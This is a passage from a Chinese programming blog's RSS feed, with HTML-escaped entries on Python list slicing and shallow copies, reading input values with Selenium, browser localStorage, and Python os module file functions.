&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(b)     &lt;span style=&#34;color:#75715e&#34;&gt;# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(id(a)) &lt;span style=&#34;color:#75715e&#34;&gt;# 41946376&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(id(b)) &lt;span style=&#34;color:#75715e&#34;&gt;# 41921864&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copy()
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(b)     &lt;span style=&#34;color:#75715e&#34;&gt;# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(id(a)) &lt;span style=&#34;color:#75715e&#34;&gt;# 39783752&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(id(b)) &lt;span style=&#34;color:#75715e&#34;&gt;# 39759176&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要注意的是：&lt;strong&gt;[:]和.copy()都属于浅拷贝，只拷贝最外层元素，内层嵌套元素则通过引用方式共享，而非独立分配内存&lt;/strong&gt;，如果需要彻底拷贝则需采用深拷贝方式，如下例所示：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a={}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(a))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;      &lt;span style=&#34;color:#75715e&#34;&gt;# 修改b的最外层元素，将1变成9&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 修改b的内嵌层元素&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a={}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(a))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b={}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(b))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;id(a)={}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(id(a)))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;id(b)={}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(id(b)))
a&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 原始a&lt;/span&gt;
a&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# b修改内部元素A为D后，a中的A也变成了D，说明共享内部嵌套元素，但外部元素1没变。&lt;/span&gt;
b&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 修改后的b&lt;/span&gt;
id(a)&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38669128&lt;/span&gt;
id(b)&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38669192&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d修改单个元素&#34;&gt;d.修改单个元素&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;e在某个位置插入元素&#34;&gt;e.在某个位置插入元素&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;f替换一部分元素&#34;&gt;f.替换一部分元素&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—获取 input 输入的文本值</title>
        <link>https://ac-lm.github.io/posts/python/python%E8%8E%B7%E5%8F%96-input-%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E6%9C%AC%E5%80%BC/</link>
        <pubDate>Fri, 26 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E8%8E%B7%E5%8F%96-input-%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E6%9C%AC%E5%80%BC/</guid>
        <description>&lt;h2 id=&#34;1get_attributevalue获取输入的文本值&#34;&gt;1.get_attribute(&amp;lsquo;value&amp;rsquo;)获取输入的文本值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;inputContext1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_xpath(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;//input&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_attribute(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2通过执行js操作来获取输入的文本值&#34;&gt;2.通过执行JS操作来获取输入的文本值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;inputContext2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return document.getElementsByClassName(&amp;#39;ivu-input&amp;#39;)[0].value&amp;#34;&lt;/span&gt;
driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execute_script(inputContext2)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3get_attributetextcontent获取元素的文本值&#34;&gt;3.get_attribute(&amp;lsquo;textContent&amp;rsquo;)获取元素的文本值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;logoContext1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_xpath(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;//div[@class=&amp;#34;logo&amp;#34;]/span&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_attribute(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;textContent&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4通过text来获取文本值&#34;&gt;4.通过text来获取文本值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;logoContext2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_xpath(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;//div[@class=&amp;#34;logo&amp;#34;]/span&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5通过执行js操作来获取输入的文本值&#34;&gt;5.通过执行JS操作来获取输入的文本值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;logoContext3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return document.getElementsByTagName(&amp;#39;span&amp;#39;)[0].innerText&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—什么是 localStorage</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-localstorage/</link>
        <pubDate>Fri, 26 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-localstorage/</guid>
        <description>&lt;h2 id=&#34;1什么是-localstorage&#34;&gt;1.什么是 localStorage&lt;/h2&gt;
&lt;p&gt;在HTML5中，新加入了一个localStorage特性，这个特性主要是用来作为本地存储来使用的，解决了cookie存储空间不足的问题(cookie中每条cookie的存储空间为4k)，localStorage中一般浏览器支持的是5M大小，这个在不同的浏览器中localStorage会有所不同。&lt;/p&gt;
&lt;h2 id=&#34;2localstorage的优势&#34;&gt;2.localStorage的优势&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;localStorage拓展了cookie的4K限制&lt;/li&gt;
&lt;li&gt;localStorage会可以将第一次请求的数据直接存储到本地，这个相当于一个5M大小的针对于前端页面的数据库，相比于cookie可以节约带宽，但是这个却是只有在高版本的浏览器中才支持的&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3localstorage的局限&#34;&gt;3.localStorage的局限&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;浏览器的大小不统一，并且在IE8以上的IE版本才支持localStorage这个属性&lt;/li&gt;
&lt;li&gt;目前所有的浏览器中都会把localStorage的值类型限定为string类型，这个在对我们日常比较常见的JSON对象类型需要一些转换&lt;/li&gt;
&lt;li&gt;localStorage在浏览器的隐私模式下面是不可读取的&lt;/li&gt;
&lt;li&gt;localStorage本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡&lt;/li&gt;
&lt;li&gt;localStorage不能被爬虫抓取到&lt;/li&gt;
&lt;li&gt;localStorage与sessionStorage的唯一一点区别就是localStorage属于永久性存储，而sessionStorage属于当会话结束的时候，sessionStorage中的键值对会被清空&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4localstorage的使用&#34;&gt;4.localStorage的使用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;localStorage的使用是遵循同源策略的，不同的网站直接是不能共用相同的localStorage&lt;/li&gt;
&lt;li&gt;localStorage只支持string类型的存储，即使存储进去的是int类型，但是打印出来仍是string类型&lt;/li&gt;
&lt;li&gt;localStorage相当于一个前端的数据库，也有增删查改的功能&lt;/li&gt;
&lt;li&gt;一般会将JSON存入localStorage中，但是在localStorage会自动将localStorage转换成为字符串形式，这个时候可以使用JSON.stringify()这个方法，来将JSON转换成为JSON字符串。读取之后要将JSON字符串转换成为JSON对象，使用JSON.parse()方法&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Python—os 模块文件操作</title>
        <link>https://ac-lm.github.io/posts/python/pythonos-%E6%A8%A1%E5%9D%97%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</link>
        <pubDate>Thu, 25 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonos-%E6%A8%A1%E5%9D%97%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考文档：&lt;a class=&#34;link&#34; href=&#34;https://docs.python.org/zh-cn/3/library/os.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; os文档  @Python文档  &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1oslistdir&#34;&gt;1.os.listdir()&lt;/h2&gt;
&lt;p&gt;os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。它不包括隐藏文件如（. 或 .. 开头的文件）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys

path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html/&amp;#34;&lt;/span&gt;
dirs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;listdir(path)
&lt;span style=&#34;color:#75715e&#34;&gt;# path -- 需要列出的目录路径&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 返回指定路径下的文件和文件夹列表&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; dirs:
    print(file)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2ospathexists&#34;&gt;2.os.path.exists()&lt;/h2&gt;
&lt;p&gt;os.path.exists() 方法用于判断文件夹是否存在&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os

path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html/&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# path -- 需要列出的目录路径&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(path):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3ospathabspath&#34;&gt;3.os.path.abspath()&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前文件的绝对路径&lt;/span&gt;
path1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;abspath(__file__)
